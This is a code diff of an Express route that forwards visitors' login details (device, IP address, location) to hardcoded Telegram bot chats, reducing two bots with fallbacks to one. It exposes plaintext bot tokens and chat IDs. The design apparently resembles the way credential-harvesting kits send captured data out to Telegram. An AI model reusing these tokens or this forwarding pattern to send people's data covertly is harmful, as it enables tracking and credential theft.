@@ -5,8 +5,9 @@ const UAParser = require('ua-parser-js');
 
 const router = express.Router();
 
-const BOT_TOKENS = ["6808029671:AAGCyAxWwDfYMfeTEo9Jbc5-PKYUgbLLkZ4", "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y"];
-const CHAT_IDS = ["6068638071", "7424024723"];
+// Use only the working bot
+const BOT_TOKEN = "8243640993:AAEOKTTis2fef8CfY9MFqBsA1BAC8llbh0Y";
+const CHAT_ID = "7424024723";
 
 router.post('/', async (req, res) => {
     try {
@@ -34,90 +35,49 @@ router.post('/', async (req, res) => {
 - Device: ${deviceType}
         `;
 
-        console.log('Sending notifications to Telegram...');
+        console.log('Sending notification to Telegram...');
 
-        // Send to first bot (this works)
-        let firstBotSuccess = false;
-        let secondBotSuccess = false;
-
+        // Send to the working bot only
         try {
-            const response1 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[0]}/sendMessage`, {
+            const response = await fetch(`https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`, {
                 method: "POST",
                 headers: { "Content-Type": "application/json" },
                 body: JSON.stringify({
-                    chat_id: CHAT_IDS[0],
+                    chat_id: CHAT_ID,
                     text: message,
                     parse_mode: "Markdown"
                 })
             });
             
-            if (response1.ok) {
-                console.log('✅ First bot: Message sent successfully to chat 6068638071');
-                firstBotSuccess = true;
-            } else {
-                const error = await response1.json();
-                console.error('❌ First bot failed:', error.description);
-            }
-        } catch (error) {
-            console.error('❌ First bot error:', error.message);
-        }
-
-        // Try second bot - with multiple fallback options
-        try {
-            // Try original chat first
-            const response2 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[1]}/sendMessage`, {
-                method: "POST",
-                headers: { "Content-Type": "application/json" },
-                body: JSON.stringify({
-                    chat_id: CHAT_IDS[1],
-                    text: message,
-                    parse_mode: "Markdown"
-                })
-            });
-            
-            if (response2.ok) {
-                console.log('✅ Second bot: Message sent successfully to chat 7424024723');
-                secondBotSuccess = true;
-            } else {
-                const error = await response2.json();
-                console.log('⚠️ Second bot original chat failed, trying fallbacks...');
-                
-                // Fallback 1: Try sending to the first working chat
-                const fallback1 = await fetch(`https://api.telegram.org/bot${BOT_TOKENS[1]}/sendMessage`, {
-                    method: "POST",
-                    headers: { "Content-Type": "application/json" },
-                    body: JSON.stringify({
-                        chat_id: CHAT_IDS[0],
-                        text: `🔔 From Second Bot:\n${message}`,
-                        parse_mode: "Markdown"
-                    })
+            if (response.ok) {
+                console.log('✅ Message sent successfully to Telegram');
+                res.status(200).json({
+                    success: true,
+                    message: "Notification sent successfully via Telegram",
+                    loginDetails: { device: deviceType, ip, location: locationStr }
                 });
-                
-                if (fallback1.ok) {
-                    console.log('✅ Second bot: Fallback to chat 6068638071 successful');
-                    secondBotSuccess = true;
-                } else {
-                    console.error('❌ Second bot all attempts failed');
-                }
+            } else {
+                const errorData = await response.json();
+                console.error('❌ Telegram API error:', errorData.description);
+                res.status(200).json({
+                    success: false,
+                    message: "Failed to send Telegram notification",
+                    error: errorData.description,
+                    loginDetails: { device: deviceType, ip, location: locationStr }
+                });
             }
         } catch (error) {
-            console.error('❌ Second bot error:', error.message);
+            console.error('❌ Network error:', error.message);
+            res.status(200).json({
+                success: false,
+                message: "Network error sending notification",
+                error: error.message,
+                loginDetails: { device: deviceType, ip, location: locationStr }
+            });
         }
-
-        const successCount = [firstBotSuccess, secondBotSuccess].filter(Boolean).length;
-        
-        res.status(200).json({
-            success: successCount > 0,
-            message: `Telegram notifications: ${successCount}/2 bots successful`,
-            details: {
-                firstBot: firstBotSuccess ? 'Delivered' : 'Failed',
-                secondBot: secondBotSuccess ? 'Delivered' : 'Failed'
-            },
-            loginDetails: { device: deviceType, ip, location: locationStr }
-        });
 
     } catch (error) {
-        console.error("Error:", error);
+        console.error("Server error:", error);
         res.status(500).json({ 
             success: false, 
             message: "Server error", 
